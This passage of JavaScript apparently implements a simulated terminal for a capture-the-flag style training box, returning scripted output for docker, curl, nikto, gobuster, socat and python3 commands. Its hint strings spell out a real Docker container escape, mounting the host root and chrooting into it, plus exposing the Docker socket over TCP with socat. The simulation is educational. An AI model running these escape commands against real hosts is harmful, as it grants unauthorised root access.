                // Check for the host filesystem mount escape
                if (raw.includes('-v /:/mnt/host') || raw.includes('-v /:/host') || raw.includes('--volume /:/')) {
                    // Check for chroot or /bin/bash or /bin/sh
                    if (raw.includes('chroot') || raw.includes('/bin/bash') || raw.includes('/bin/sh') || raw.includes('sh') || raw.includes('bash')) {
                        A11Config._hostShellActive = true;
                        A11Config._sshSessionActive = false;
                        return `Unable to find image 'alpine:latest' locally
latest: Pulling from library/alpine
Digest: sha256:c5b1261d6d3e43071626931fc004f70149baeba2c8ec672bd4f27761f8e1ad6b
Status: Downloaded newer image for alpine:latest

[+] Container started with host filesystem mounted at /mnt/host
[+] Chroot into /mnt/host successful — you now have a root shell on the HOST

root@vault-host:/#

[!] SUCCESS: You have escaped the container!
[!] You are now root on the Docker host (vault-host).
[!] The host filesystem is at /mnt/host (chrooted).
[!] Try: cat /opt/master_manifest.txt
[!] Or:  cat /root/root.txt`;
                    }
                    // Mount without chroot — show filesystem
                    return `Unable to find image 'alpine:latest' locally
latest: Pulling from library/alpine
Status: Downloaded newer image for alpine:latest

/ # ls /mnt/host/
bin   boot  dev   etc   home  lib   mnt   opt   proc  root  run   sbin  srv   sys   tmp   usr   var

/ # ls /mnt/host/opt/
master_manifest.txt

[*] Host filesystem is mounted at /mnt/host.
[*] Use chroot /mnt/host /bin/bash for a proper root shell.
[*] Or read files directly: cat /mnt/host/opt/master_manifest.txt`;
                }

                // Running a container without the critical mount
                if (raw.includes('alpine') || raw.includes('ubuntu') || raw.includes('busybox')) {
                    return `Unable to find image locally. Pulling...
Status: Downloaded newer image.

/ #
[*] You started a new container, but without mounting the host filesystem.
[*] To escape, mount the host root: docker run -v /:/mnt/host --rm -it alpine chroot /mnt/host /bin/bash`;
                }

                return 'docker run: specify an image to run.\nUsage: docker run [OPTIONS] IMAGE [COMMAND] [ARG...]';
            }

            // ── docker version ──
            if (subcmd === 'version') {
                return `Client:
 Version:           24.0.7
 API version:       1.43
 Go version:        go1.20.10
 Git commit:        afdd53b
 Built:             Thu Oct 26 09:07:41 2023
 OS/Arch:           linux/amd64
 Context:           default

Server:
 Engine:
  Version:          24.0.7
  API version:      1.43 (minimum version 1.12)
  Go version:       go1.20.10
  Git commit:       311b9ff
  Built:            Thu Oct 26 09:07:41 2023
  OS/Arch:          linux/amd64
  Experimental:     false
 containerd:
  Version:          1.6.24
 runc:
  Version:          1.1.9`;
            }

            // ── docker network ──
            if (subcmd === 'network') {
                if (args[1] === 'ls' || args[1] === 'list') {
                    return `NETWORK ID     NAME            DRIVER    SCOPE
1a2b3c4d5e6f   bridge          bridge    local
7a8b9c0d1e2f   host            host      local
3a4b5c6d7e8f   none            null      local
f1e2d3c4b5a6   vault_network   bridge    local`;
                }
                if (args[1] === 'inspect' && (args[2] || '').includes('vault')) {
                    return `[
  {
    "Name": "vault_network",
    "Id": "f1e2d3c4b5a69876543210fedcba9876543210fedcba9876543210fedcba",
    "Driver": "bridge",
    "IPAM": {
      "Config": [{ "Subnet": "172.18.0.0/16", "Gateway": "172.18.0.1" }]
    },
    "Containers": {
      "a1b2...": { "Name": "vault-indexer-01", "IPv4Address": "172.18.0.2/16" },
      "b2c3...": { "Name": "vault-web-01",     "IPv4Address": "172.18.0.3/16" },
      "c3d4...": { "Name": "vault-db-01",      "IPv4Address": "172.18.0.4/16" },
      "d4e5...": { "Name": "vault-logs-01",    "IPv4Address": "172.18.0.5/16" }
    }
  }
]`;
                }
                return 'Usage: docker network [ls|inspect|create|connect|disconnect] ...';
            }

            // ── docker logs ──
            if (subcmd === 'logs') {
                const containerName = args[1] || '';
                if (containerName.includes('indexer') || containerName === 'a1b2c3d4e5f6') {
                    return `[2024-12-02 14:22:31] INFO  Indexer started (PID 1)
[2024-12-02 14:22:32] INFO  Connected to vault-db-01:5432
[2024-12-02 14:22:33] INFO  Docker socket detected: /var/run/docker.sock
[2024-12-02 14:22:33] WARN  Socket mount enabled — required for self-healing mode
[2024-12-02 14:25:01] INFO  Scheduled index refresh complete (4 containers scanned)
[2024-12-02 14:30:01] INFO  Scheduled index refresh complete (4 containers scanned)
[2024-12-02 14:35:01] INFO  Scheduled index refresh complete (4 containers scanned)`;
                }
                if (containerName.includes('web') || containerName === 'b2c3d4e5f6a1') {
                    return `10.10.14.50 - - [02/Dec/2024:14:23:11 +0000] "GET /vault/ HTTP/1.1" 200 3841
10.10.14.50 - - [02/Dec/2024:14:23:15 +0000] "GET /vault/status/ HTTP/1.1" 200 4120
10.10.14.50 - - [02/Dec/2024:14:24:02 +0000] "POST /vault/ HTTP/1.1" 401 220`;
                }
                return `Error: No such container: ${containerName}`;
            }

            // ── unknown docker subcommand ──
            return `docker: '${subcmd}' is not a docker command.
See 'docker --help'

Management Commands:
  container   Manage containers
  image       Manage images
  network     Manage networks
  volume      Manage volumes

Commands:
  exec        Execute a command in a running container
  images      List images
  info        Display system-wide information
  inspect     Return low-level information on Docker objects
  logs        Fetch the logs of a container
  network     Manage networks
  ps          List containers
  run         Create and run a new container
  version     Show the Docker version information`;
        },

        'curl': function(args, term, engine) {
            const raw = args.join(' ');
            const url = args.find(a => !a.startsWith('-') && (a.startsWith('http') || a.startsWith('/'))) || '';

            // curl to Docker socket from inside container
            if (raw.includes('--unix-socket') && raw.includes('docker.sock')) {
                if (!A11Config._sshSessionActive && !A11Config._hostShellActive) {
                    return 'curl: (7) Couldn\'t connect to server — /var/run/docker.sock does not exist on your Kali machine.';
                }
                if (raw.includes('/containers/json')) {
                    return `[{"Id":"a1b2c3d4e5f6...","Names":["/vault-indexer-01"],"Image":"archivist/indexer:2.4","State":"running"},
{"Id":"b2c3d4e5f6a1...","Names":["/vault-web-01"],"Image":"nginx:1.24-alpine","State":"running"},
{"Id":"c3d4e5f6a1b2...","Names":["/vault-db-01"],"Image":"postgres:16-alpine","State":"running"},
{"Id":"d4e5f6a1b2c3...","Names":["/vault-logs-01"],"Image":"fluentd:v1.16","State":"running"}]`;
                }
                if (raw.includes('/images/json')) {
                    return `[{"Id":"sha256:4a5b6c...","RepoTags":["archivist/indexer:2.4"],"Size":89200000},
{"Id":"sha256:1a2b3c...","RepoTags":["nginx:1.24-alpine"],"Size":41100000},
{"Id":"sha256:7a8b9c...","RepoTags":["postgres:16-alpine"],"Size":233000000},
{"Id":"sha256:9a0b1c...","RepoTags":["alpine:3.18"],"Size":7340000}]`;
                }
                if (raw.includes('/info')) {
                    return `{"ServerVersion":"24.0.7","Containers":5,"ContainersRunning":4,"Images":6,"OperatingSystem":"Ubuntu 22.04.3 LTS","KernelVersion":"5.15.0-88-generic","Name":"vault-host","NCPU":4,"MemTotal":8345169920}`;
                }
                return `{"message":"page not found"}`;
            }

            // curl to the vault web portal
            if (url.includes('10.10.14.40') && url.includes('/vault')) {
                if (url.includes('/vault/status')) {
                    return `<!DOCTYPE html>
<html><head><title>Archivist Guild — System Status</title></head>
<body>
<h1>Container Infrastructure Status</h1>
<table>
<tr><th>Container</th><th>Status</th></tr>
<tr><td>vault-indexer-01</td><td>Running</td></tr>
<tr><td>vault-web-01</td><td>Running</td></tr>
<tr><td>vault-db-01</td><td>Running</td></tr>
<tr><td>vault-logs-01</td><td>Degraded</td></tr>
</table>
<p><strong>Docker Socket:</strong> /var/run/docker.sock → vault-indexer-01</p>
</body></html>`;
                }
                if (url.includes('/vault/api')) {
                    return `<!DOCTYPE html>
<html><head><title>Archivist Guild — API Docs</title></head>
<body>
<h1>Container Management API</h1>
<p>Docker socket mounted in vault-indexer-01 for automated orchestration.</p>
<p>SSH access: port 2222 (archivist@10.10.14.40)</p>
</body></html>`;
                }
                return `<!DOCTYPE html>
<html><head><title>Archivist Guild — Data Vault</title></head>
<body>
<h1>Archivist Guild — Data Vault Portal</h1>
<p>Containerized Archive System v2.4.1</p>
<form method="POST"><input name="username"><input name="password" type="password"><button>Authenticate</button></form>
</body></html>`;
            }

            if (!url) return 'curl: try \'curl --help\' or \'curl --manual\' for more information';

            return `curl: (7) Failed to connect to ${url.replace(/https?:\/\//, '').split('/')[0]}: Connection refused`;
        },

        'ping': function(args) {
            const target = args.find(a => !a.startsWith('-')) || '';
            if (!target) return 'Usage: ping [-c count] destination';

            if (target === '10.10.14.40') {
                return `PING 10.10.14.40 (10.10.14.40) 56(84) bytes of data.
64 bytes from 10.10.14.40: icmp_seq=1 ttl=64 time=31.2 ms
64 bytes from 10.10.14.40: icmp_seq=2 ttl=64 time=30.8 ms
64 bytes from 10.10.14.40: icmp_seq=3 ttl=64 time=31.0 ms

--- 10.10.14.40 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss
rtt min/avg/max/mdev = 30.8/31.0/31.2/0.163 ms`;
            }

            return `ping: ${target}: Name or service not known`;
        },

        'nikto': function(args) {
            if (args.length === 0) return 'Usage: nikto -h <target> [options]\nExample: nikto -h 10.10.14.40';
            return `- Nikto v2.5.0
+ Target IP:       10.10.14.40
+ Target Hostname:  vault.archivist-guild.local
+ Target Port:      80
+ Server: nginx/1.24.0
+ /vault/: Login page detected — form-based authentication
+ /vault/status/: Container infrastructure status page — lists Docker containers and socket mount
+ /vault/api/: API documentation — references Docker socket at /var/run/docker.sock
+ /vault/api/: SSH access documented on port 2222 (container shell)
+ X-Powered-By: Docker/24.0.7 header detected
+ 8 items checked: 4 findings`;
        },

        'gobuster': function(args) {
            if (args.length === 0) return 'Usage: gobuster dir -u <url> -w <wordlist>\nExample: gobuster dir -u http://10.10.14.40/ -w /usr/share/wordlists/dirb/common.txt';
            const target = args.find(a => a.startsWith('http')) || 'http://10.10.14.40/';
            return `Gobuster v3.6
[+] Url:          ${target}
[+] Wordlist:     /usr/share/wordlists/dirb/common.txt
[+] Status codes: 200,204,301,302,307,401,403
===============================================================
/vault/              (Status: 200) [Size: 3841]
/vault/status/       (Status: 200) [Size: 4120]
/vault/api/          (Status: 200) [Size: 5204]
===============================================================
Finished`;
        },

        'socat': function(args, term, engine) {
            if (args.length === 0) return 'Usage: socat [options] <address1> <address2>\nExample: socat TCP-LISTEN:2375,reuseaddr,fork UNIX-CONNECT:/var/run/docker.sock';
            if (!A11Config._sshSessionActive) {
                return 'socat: command not available on Kali (install with: apt install socat)';
            }
            const raw = args.join(' ');
            if (raw.includes('docker.sock')) {
                return `[*] Forwarding Docker socket to TCP...
[*] socat TCP-LISTEN:2375,reuseaddr,fork UNIX-CONNECT:/var/run/docker.sock
[*] Docker API now accessible on TCP port 2375
[*] You can now use: curl http://localhost:2375/v1.43/containers/json
[*] Or from Kali: curl http://10.10.14.40:2375/v1.43/info
[hint] Using the docker CLI directly is simpler: docker ps, docker run, etc.`;
            }
            return 'socat: specify source and destination.\nExample: socat TCP-LISTEN:2375,reuseaddr,fork UNIX-CONNECT:/var/run/docker.sock';
        },

        'python3': function(args, term, engine) {
            if (args.length === 0) return 'Python 3.11.6 (default, Oct  8 2023, 05:06:43) [GCC 13.2.0] on linux\nType "help", "copyright", "credits" or "license" for more information.\n>>> ';
            const script = args.find(a => a.endsWith('.py')) || '';
            if (script.includes('docker_enum')) {
                if (!A11Config._sshSessionActive && !A11Config._hostShellActive) {
                    return `[*] Enumerating Docker via socket...
Traceback (most recent call last):
  File "docker_enum.py", line 11, in query_docker
    conn.sock.connect("/var/run/docker.sock")
FileNotFoundError: [Errno 2] No such file or directory

[hint] Run this script from inside the container (SSH to port 2222 first).`;
                }
                return `[*] Enumerating Docker via socket...
[+] Found 4 running containers
    - /vault-indexer-01: archivist/indexer:2.4
    - /vault-web-01: nginx:1.24-alpine
    - /vault-db-01: postgres:16-alpine
    - /vault-logs-01: fluentd:v1.16
[+] Docker version: 24.0.7
[+] OS: Ubuntu 22.04.3 LTS
[+] Host name: vault-host

[!] Full Docker daemon access confirmed via socket.`;
            }
            if (script.includes('linpeas')) {
                return `linPEAS would run here in a real engagement.
For this box, focus on Docker-specific enumeration:
  - ls -la /var/run/docker.sock
  - capsh --print
  - cat /proc/1/cgroup
  - mount | grep docker`;
            }
            return `python3: can't open file '${script}': [Errno 2] No such file or directory`;
        }
    },

    // ===============================================================
    // HTML HELPERS
    // ===============================================================

    _escHtml(str) {
        if (typeof str !== 'string') return String(str);
        const div = document.createElement('div');
        div.textContent = str;
        return div.innerHTML;
    },

    _stripHtml(html) {
        const tmp = document.createElement('div');
        tmp.innerHTML = html;
        const tables = tmp.querySelectorAll('table');
        tables.forEach(table => {
            const rows = table.querySelectorAll('tr');
            let text = '';
            rows.forEach(row => {
                const cells = row.querySelectorAll('td, th');
                const cellTexts = Array.from(cells).map(c => c.textContent.trim().padEnd(20));
                text += cellTexts.join('  ') + '\n';
            });
            table.replaceWith(document.createTextNode(text));
        });
        const pres = tmp.querySelectorAll('pre');
        pres.forEach(pre => {
            pre.replaceWith(document.createTextNode(pre.textContent));
        });
        return tmp.textContent.trim();
    }

};
